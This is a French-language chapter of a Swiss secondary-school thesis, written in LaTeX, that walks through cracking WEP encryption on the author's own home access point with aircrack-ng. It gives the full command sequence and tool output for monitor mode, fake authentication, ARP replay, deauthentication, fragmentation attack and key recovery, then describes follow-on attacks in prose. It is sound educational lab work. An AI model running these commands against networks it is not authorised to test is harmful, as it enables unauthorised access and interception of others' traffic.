@@ -1,0 +1,300 @@
+\chapter{Crack d'un réseau WEP}
+
+\section{Plateforme de test}
+
+\begin{figure}[h!tbp]
+	\centering
+	\frame{\includegraphics[width=\textwidth]{images/reseau.png}}
+	\caption{Schéma du réseau domestique}
+\end{figure}
+
+La partie pratique de ce Travail de Maturité est réalisée à l'aide de Kali-Linux. C'est une distribution de \emph{Penetration Testing}\footnote{Tests de sécurité d'un système informatique} basée sur Linux. Libre et open-source, Kali est la suite de BackTrack, reprenant les mêmes idées de concept, mais en version améliorée. Kali et Backtrack fournissent un ensemble d'outils nécessaires aux tests de sécurité d'un réseau, en partant du scanner de port jusqu'aux crackers de mot-de-passe et une multitude de programmes différents.
+
+Kali-Linux développe principalement l'autonomie de l'utilisateur, lui permettant d'appeler chaque outil directement plutôt que d'avoir à le rechercher, ou permettant la modification de la distribution selon son vouloir.
+
+Kali est installé en \emph{Live Boot}\footnote{Lancement direct} sur un disque dur externe de 500Go. Une partition de 300Go lui est mise de côté pour y ajouter de la persistance et empêcher les pertes de données. La persistance est un mécanisme qui fait en sorte de sauvegarder les données lors de l'utilisation de programmes. Lorsque que l'ordinateur est éteint, les informations ne disparaissent pas.
+\\
+
+Le réseau attaqué est personnel et a été mis en place au commencement du Travail de Maturité avec l'aide de mon père. La figure 4.1 le montre. La configuration est telle que l'accès Internet passe d'abord par un modem, puis une première station d'accès, qui gère la plus grande partie du réseau domestique. Ensuite, l'accès à Internet est dirigé vers un hub Ethernet\footnote{Appareil informatique qui permet de concentrer la communication de plusieurs équipements sur un même support.} qui lui partage le réseau filaire sur deux autres ordinateurs et sur l'autre station d'accès, celle qui sera attaquée. Sur cette dernière sont connectés mon ordinateur portable d'où le travail pratique se fera et mon téléphone portable qui créera du flux réseau.
+
+Bien que la partie pratique implique l'utilisation d'outils et de techniques illégales, elles sont réalisées dans un cadre personnel et approuvé. Aucune donnée n'est détériorée, ni soustraite à qui que ce soit. Le but étant uniquement éducatif et non de nuire, ce Travail de Maturité suit et respecte la loi suisse à ce sujet, selon les articles présentés dans le chapitre 1 et en annexe.
+\\
+
+Le schéma de la page précédente (figure 4.1) résume la mise en place du réseau. Le contenu de la box rouge est l'AP attaqué, mon ordinateur et mon téléphone portable.
+
+
+\section{Logiciels et lignes de code}
+Lors d'une attaque d'un réseau sécurisé WEP, plusieurs logiciels sont utilisés. Cette section sert à présenter ces derniers et expliquer leur but, leur fonctionnement et la manière dont ils sont appelés, par lignes de commande. Tous font partie de la suite \emph{aircrack-ng} qu'on trouve sur Internet. C'est un programme qui peut retrouver les clés WEP à l'aide des attaques décrites dans le chapitre 3, mais aussi un équipement d'outils servant à l'audit d'un réseau sans-fil.
+
+Tout d'abord, les tentatives se feront toutes dans des terminaux. C'est dans ces derniers que sont écrites les lignes de commande nécessaires.
+
+À chaque appel, des options complémentaires peuvent être inscrites pour donner des spécifications.
+
+	\paragraph{airmon-ng}
+Cette commande lance un petit programme servant à montrer les interfaces réseaux, comme la carte WiFi ou la connexion filaire, disponibles sur l'ordinateur utilisé. Le plus souvent, \emph{eth0} ou \emph{wlan0} apparaitront comme disponible. Elle sert aussi à modifier l'interface choisie en enclenchant le mode moniteur.
+
+	\paragraph{airodump-ng}
+Celle-ci appelle un programme important et conséquent. Il permet d'afficher les points d'accès détectés par la carte WiFi et les clients essayant de s'y connecter. Dans la ligne de commande, il peut être précisé sur quel canal, type d'encryptage, BSSID et ESSID se focaliser. 
+
+Airodump-ng sert principalement à capturer les paquets circulant entre stations et clients et est très utile pour les IVs du WEP. Finalement, tous les détails des paquets, stations, clients et informations qui ont transités et été capturés peuvent être écrits dans des fichiers nommés en .cap (fichiers compressés).
+
+	\paragraph{aireplay-ng}
+Ce programme est utilisé pour injecter des paquets sur le réseau attaqué. Le but premier de cet outil est de créer du trafic qui décuplera le nombre de paquets reçus, lesquels pourront être utilisés plus tard avec aircrack-ng.
+
+Il comporte plusieurs types d'attaques, certaines décrites dans le chapitre précédent, qui dépendent du besoin de l'utilisateur et de l'encryptage. Pour l'encryptage WEP, la différence se fera s'il y a déjà du trafic de données au moment de l'attaque ou pas.
+
+	\paragraph{packetforge-ng}	
+Packetforge-ng ne sera seulement utilisé si certaines options ont été choisies lors de l'utilisation de aireplay-ng, lorsque qu'il n'y a pas de trafic sur le réseau choisi. Il permet de créer de faux paquets cryptés qui peuvent être injectés ensuite. Ils déclenchent des requêtes ARP qui créeront du flux réseau.
+	
+	\paragraph{aircrack-ng}
+Programme final utilisé lors de l'attaque d'un encryptage, il doit cracker la clé de sécurité. Il se sert de tous les paquets récoltés pour décrypter la clé WEP et l'afficher en bites ou au format ASCII, acronyme de \emph{American Standard Code for Information Interchange}, qui signifie code américain normalisé pour l'échange d'informations.	
+	
+
+
+\section{Tentatives}
+Le piratage d'une clé de chiffrement WEP peut se faire selon deux méthodes. Elles se différencient selon le fait qu'un client est connecté, ou pas, à l'AP. Les deux méthodes vont êtres essayées et présentées.
+
+	\subsection{Attaque WEP avec client connecté}
+Au début d'une attaque, le mode moniteur doit être enclenché sur la carte sans-fil. Pour rappel, il permet d'écouter tout le trafic d'un réseau sans-fil et de capturer les paquets sans être connectés sur un AP.
+
+		\subsubsection{Mise en route du mode moniteur}
+Un terminal est ouvert et la première commande est rentrée :
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# airmon-ng start wlan0
+\end{lstlisting}
+
+Certains processus, les tâches en cours d'exécution sur un ordinateur, peuvent déranger lors d'une attaque, il est conseillé de les stopper. Une commande les cherche et le fait automatiquement :
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# airmon-ng check kill
+\end{lstlisting}
+
+		\subsubsection{Écoute du réseau, \og sniffing \fg{} }
+Airodump-ng doit maintenant être lancé pour découvrir tous les points d'accès disponibles, sans oublier de spécifier l'interface choisie : notre carte réseau sans-fil en mode moniteur, \emph{mon0} ici. 
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# airodump-ng mon0
+\end{lstlisting}
+
+Après avoir arrêté la première recherche à l'aide de CTRL+C, car rien n'est encore enregistré, la même commande est relancée mais avec certaines spécifications. 
+\begin{itemize}
+	\item[$\bullet$] -c : spécifie le canal sur lequel se situe le point d'accès
+	\item[$\bullet$] - -bssid : spécifie le BSSID du point d'accès
+	\item[$\bullet$] -w : crée un fichier .cap au nom donné par l'utilisateur qui capture les données nécessaires pour la suite, dont les paquets 
+\end{itemize}
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# airodump-ng -c 11 --bssid 00:1F:3F:14:A9:EF 
+    -w hackWEP mon0
+\end{lstlisting}
+
+\begin{lstlisting}[style=smaller]
+CH 11 ][ Elapsed: 1 min ][ 2014-08-19 20:46
+
+BSSID              PWR  RXQ Beacons #Data, #/s  CH  MB  ENC  CIPHER AUTH  ESSID
+
+00:1F:3F:14:A9:EF    9  100     904   131    5  11  54e WEP  WEP    OPN   Sam[...]
+
+BSSID              STATION             PWR    Rate     Lost    Frames   Probe  
+
+00:1F:3F:14:A9:EF  90:4C:E5:5D:37:59     0     0 - 1      0         4
+00:1F:3F:14:A9:EF  50:2E:5C:CD:7F:22    -9    54e- 1      0       257
+
+
+\end{lstlisting}
+On remarque qu'une station est connectée lorsque son adresse MAC apparaît sous station dans le deuxième tableau. 
+
+		\subsubsection{Fausse authentification et décuplement des paquets}
+À ce moment là, une fausse authentification de l'ordinateur au point d'accès se fait grâce à la commande :
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# aireplay-ng -1 0 -a 00:1F:3F:14:A9:EF mon0
+\end{lstlisting}
+
+Pour augmenter la quantité de paquets reçus, grâce à l'attaque ARP Request Replay vue dans le chapitre 3, une autre commande intervient :
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# aireplay-ng -3 -b 00:1F:3F:14:A9:EF mon0
+\end{lstlisting}
+
+Quelques détails sur les spécifications de aireplay-ng:
+\begin{itemize}
+	\item[$\bullet$] -1 : spécifie une fausse tentative d'association
+	\item[$\bullet$] -3 : spécifie l'utilisation de l'attaque ARP Request Replay
+	\item[$\bullet$] -a \& -b: définissent le BSSID de l'AP ciblé
+\end{itemize}
+
+\begin{lstlisting}[style=Bash]
+root@kali:~# aireplay-ng -1 0 -a 00:1F:3F:14:A9:EF mon0
+No source MAC (-h) specified. Using the device MAC (90:4C:E5:5D:37:59)
+20:45:49 Waiting for beacon frame (BSSID: 00:1F:3F:14:A9:EF) on channel 11
+
+20:45:49 Sending Authentification Request (Open System) [ACK]
+20:45:49 Authentification successful
+20:45:49 Sending Association Request [ACK]
+20:45:49 Association successful :-) (AID: 1)
+
+root@kali:~# aireplay-ng -3 -b 00:1F:3F:14:A9:EF mon0
+No source MAC (-h) specified. Using the device MAC (90:4C:E5:5D:37:59)
+20:46:49 Waiting for beacon frame (BSSID: 00:1F:3F:14:A9:EF) on channel 11
+Saving ARP requests in replay_arp-0819-204649.cap
+You should also start airodump-ng to capture replies.
+Read 61037 packets (got 22813 ARP requests and 12773 ACKs), sent 14012[..]
+Read 63565 packets (got 24072 ARP requests and 13426 ACKs), sent 14713[..]
+Read 64822 packets (got 24697 ARP requests and 13753 ACKs), sent 15064[..]
+
+\end{lstlisting}
+
+À ce moment là, si le nombre de paquets reçus n'augmente pas, il suffit de déconnecter les stations présentes sur l'AP. Quand elles se reconnecteront, des données circuleront et seront amplifiées par l'ARP Request.
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# aireplay-ng -0 1 -a  00:1F:3F:14:A9:EF mon0
+\end{lstlisting}
+
+		\subsubsection{Crack de la clé WEP}
+Le programme aircrack-ng est lancé. Il va décrypter la clé WEP grâce aux paquets contenus dans le fichier nommé hackWEP.cap, sniffés lors de l'écoute du réseau.
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# aircrack-ng hackWEP.cap
+\end{lstlisting}
+
+\begin{lstlisting}[style=smaller]	
+			Aicrack-ng 1.2 beta3
+			
+	[00:00:00] Tested 767 key (got 65167 IVs)
+	
+KB  depth  byte(vote)
+ 0  1/  2  99(76544) AD(74752) 07(73728) 1B(73728) 68(73728) B8(73728) 67(73216)
+ 1  2/  5  74(78080) EB(76288) D3(76032) 8F(75264) 83(73728) C1(73216) 2B(72960)
+ 2  0/  1  54(96256) 60(76800) 3B(74752) DF(74752) FC(73984) 24(73728) 77(73216)
+ 3 61/  3  E9(68352) 5E(68096) 98(68096) CD(68096) E2(68096) 23(67840) 2C(67840)
+ 4  6/  4  03(73216) 57(72704) 95(72704) 9A(72704) E3(72248) 78(72192) 91(72192)
+ 
+  KEY FOUND! [ 54:72:79:48:61:63:6B:54:68:69:73:3F:21] (ASCII: TryHackThis?! )
+    Decrypted correctly: 100% 
+\end{lstlisting}
+
+
+	\subsection{Attaque WEP sans client connecté}
+Lors d'une attaque sans trafic, les premiers points sont identiques jusqu'à l'utilisation de aireplay-ng. Airmon-ng (mode moniteur) puis airodump-ng (écoute du réseau et capture des paquets) sont toujours utilisés. La différence apparaît au moment où l'on ne voit aucune station connectée sur le deuxième tableau de airodump-ng. Pour y remédier, la même fausse authentification que dans la première partie va être refaite.
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# aireplay-ng -1 0 -a 00:1F:3F:14:A9:EF mon0
+\end{lstlisting}
+
+		\subsubsection{Attaque par fragmentation}
+L'attaque par fragmentation se lance grâce à aireplay-ng à la place de l'attaque ARP Request Replay utilisée auparavant. Agissant différemment de l'attaque ChopChop décrite dans le chapitre 3, les deux manières de faire sont plutôt identiques et le message de succès quasi similaire. La source MAC du paquet relayé doit être notée car elle sera utile plus tard.
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# aireplay-ng -5 -a 00:1F:3F:14:A9:EF mon0
+\end{lstlisting}
+
+\begin{lstlisting}[style=Bash]
+root@kali:~# aireplay-ng -5 -a 00:1F:3F:14:A9:EF mon0
+No source MAC (-h) specified. Using the device MAC (90:4C:E5:5D:37:59)
+20:56:46 Waiting for beacon frame (BSSID: 00:1F:3F:14:A9:EF) on channel 11
+20:56:46 Waiting for a data packet...
+Read 185 packets...
+
+        Size: 76, FromDS: 1, ToDS: 0 (WEP)
+        
+              BSSID = 00:1F:3F:14:A9:EF
+          Dest. MAC = 01:00:5E:00:00:01
+         Source MAC = 00:1F:3F:5A:87:81
+       
+        0x0000:  0842 0000 0100 5e00 0001 001f 3f14 a9ef  .B....^.....?...
+        0x0010:  001f 3f5a 8781 c0bf 8e10 5f00 2bf8 a2ca  ..?Z......_.+...  
+        0x0020:  db9c 6c59 a9e9 16cd b9df 5a81 4c93 8555  ..lY......Z.L..U
+        0x0030:  2ac5 b129 17f0 d002 83d1 b465 26c5 c97f  *..).......e&..?
+        0x0040:  96a5 af3b 6465 681a 3b91 ef56            ...;deh.;..V
+        
+Use this packet ? y
+Saving chosen packet in replay_src-0819-205655.cap
+20:57:01 Data packet found!
+20:57:01 Sending fragmented packet
+20:57:01 Got RELAYED packet !!
+20:57:01 Trying to get 384 bytes of a keystream
+20:57:01 Got RELAYED packet !!
+20:57:01 Trying to get 1500 bytes of a keystream
+20:57:01 Got RELAYED packet !!
+Saving keystream in fragment-0819-205701.xor
+Now you can build a packet with packetforge-ng out of that 1500 bytes 
+keystream
+
+
+
+\end{lstlisting}
+
+		\subsubsection{Création du paquet ARP}
+Après avoir accepté le paquet relayé qui va créer une chaîne de caractères, sauvegardée dans fragment-0819-205701.xor, packetforge-ng, décrit au début du chapitre, est utilisé. C'est grâce à ce dernier programme qu'un paquet ARP est généré et va pouvoir être injecté sur le réseau pour augmenter les données collectées.
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# packetforge-ng --arp -y fragment-0819-205701.xor 
+    -l 192.168.178.1 -k 192.16.178.10 -h 00:1F:3F:5A:87:81 
+    -a 00:1F:3F:14:A9:EF -w ARP
+\end{lstlisting}
+
+Quelques détails sur les spécifications de packetforge-ng:
+\begin{itemize}
+	\item[$\bullet$] - -arp : crée un paquet ARP
+	\item[$\bullet$] -y : lit le fichier fragment-0819-205701.xor
+	\item[$\bullet$] -l : spécifie la source IP du faux paquet créé
+	\item[$\bullet$] -k : spécifie la destination IP du faux paquet créé
+	\item[$\bullet$] -h : spécifie la source MAC notée auparavant
+	\item[$\bullet$] -a : spécifie le BSSID du point d'accès
+	\item[$\bullet$] -w : spécifie le nom de sortie du paquet ARP
+\end{itemize}
+
+		\subsubsection{Injection du paquet ARP sur le réseau}
+Le paquet est créé et va être injecté dans le réseau, grâce à aireplay-ng. 
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# aireplay-ng -3 -b 00:1F:3F:14:A9:EF -r ARP mon0
+\end{lstlisting}
+
+Les spécifications sont les mêmes que dans la partie de l'attaque avec trafic, avec l'ajout de -r :
+\begin{itemize}
+	\item[$\bullet$] -r : Lit et utilise le paquet nommé ARP créé avec packetforge-ng
+\end{itemize}
+
+		\subsubsection{Crack de la clé WEP}
+Le nombre de data (les données) dans airodump-ng commence à augmenter rapidement et aircrack-ng peut être lancé.
+
+\begin{lstlisting}[style=Bash]
+    root@kali:~# aircrack-ng hackWEP.cap
+\end{lstlisting}
+
+
+Peu importe qu'un client soit connecté ou pas sur un réseau WiFi sécurisé en WEP, une attaque peut être réalisée en un minimum de temps, moins d'une dizaine de minutes pour un utilisateur expérimenté. Grâce à ces programmes, la clé apparaîtra finalement sous forme hexadécimal et souvent au format ASCII.
+
+
+\section{Que faire sur le réseau pénétré?}
+Le réseau a été pénétré, le pirate informatique peut l'analyser et l'attaquer en profondeur et créer de plus grands problèmes encore, que seulement découvrir les messages et informations cryptés. Il existe différents types d'attaques sur un réseau informatique qui peuvent être passives, pour la récolte d'informations, ou actives afin de perturber l'ordinateur ou le réseau cible.
+
+Quelques unes de ces exploitations de failles vont être présentées dans cette section.
+
+	\subsection{Attaques passives}
+		\subsubsection{Le sniffing}
+Déjà utilisé auparavant pour récolter les paquets afin de craquer la clé WEP, il peut aussi permettre d'écouter d'autres sortes de paquets ou informations transitant sur les équipements du réseau. À l'aide d'un programme comme Wireshark, le hacker peut analyser ces données. Il peut déchiffrer des emails, des mots de passe et autres données sensibles si elles ne sont pas cryptées.
+
+		\subsubsection{Le balayage de ports}
+Généralement, le balayage de ports sert à reconnaître quels processus d'un ordinateur sont actifs et prêts à recevoir des ordres sous forme d'informations venant de l'extérieur. Les ports peuvent être comparés à des portes ouvertes par les programmes, refermées quand le programme est quitté. Le balayage est aussi utilisé pour savoir si un port ouvert contient des vulnérabilités et si elles sont exploitables à l'aide d'un \emph{exploit}, petit programme qui permet au hacker d'utiliser une faille de sécurité dans un système d'exploitation, tel Windows, Mac OS ou une distribution Linux, ou un logiciel.
+
+	\subsection{Attaques actives}
+		\subsubsection{Déni de Service (DOS : \emph{Denial of Service})}
+L'attaque DOS est une attaque très vite remarquable par la victime et c'est même un de ses buts. En inondant massivement la bande passante du réseau, ce dernier va se saturer de sorte que les équipements connectés sur ce dernier deviennent inutilisables. Une autre manière serait d'intercepter toutes les données et les empêcher de circuler, en se combinant avec une attaque MitM (Man in the Middle, décrite dans le prochain paragraphe). Tant que la source du problème n'est pas localisée, le Déni de Service peut empêcher toute une entreprise de communiquer via son réseau. Cette dernière sera immobilisée le temps d'avoir découvert et éliminé le processus responsable.
+
+		\subsubsection{Man in the Middle}
+Aussi potentiellement utilisable contre l'encryptage WEP, les attaques dites de \og l'homme du milieu \fg{} permettent à un attaquant de se positionner au milieu d'une communication entre deux victimes. Le hacker interceptera alors tout trafic et données échangées et sera capable de les modifier ou les lire. S'il se situe entre un serveur Internet et un client, le hacker pourra rediriger ce dernier vers des sites d'où il téléchargera des \emph{malwares} et autres virus. Il peut aussi conduire une attaque DOS en arrêtant simplement toute communication au lieu de surcharger le réseau.
+
+Un exemple d'une attaque MitM, acronyme de \emph{Man in the Middle}, est démontré dans le chapitre 3.
+
+
+		\subsubsection{Backdoors}
+Après avoir pénétré dans un ordinateur, un hacker remplace les fichiers systèmes par des fichiers qu'il aura modifiés au préalable ou modifie directement le noyau du système d'exploitation. Le noyau est un espace mémoire isolé qui ne peut être modifié par des programmes tiers et qui forme la base d'un système d'exploitation. Caché de cette façon, si le hacker doit perdre l'accès à l'ordinateur de sa victime pour une quelconque raison, il pourra reprendre contrôle de l'ordinateur victime et avoir son accès complet sans devoir le pénétrer encore une fois.
+\\
+
+Si un réseau a été pénétré, les conséquences peuvent devenir très rapidement lourdes. Un hacker peut s'approprier l'identité de sa victime et lui faire perdre toute crédibilité. À l'aide de certaines méthodes il découvrira des mots de passe qui pourraient lui permettre de modifier des données sensibles ou de créer des transactions bancaires. Le chantage est aussi imaginable. 
+
+Tout cela se passe à distance, sans aucun contact entre la victime et l'attaquant. Ils pourraient être très proches ou alors complètement inconnus l'un de l'autre. C'est pour cela que des protections doivent être mises en place pour empêcher toute intrusion non autorisée et compromettante. De nos jours heureusement, les failles découvertes sont comblées en un minimum de temps par les administrateurs et autres personnes compétentes !
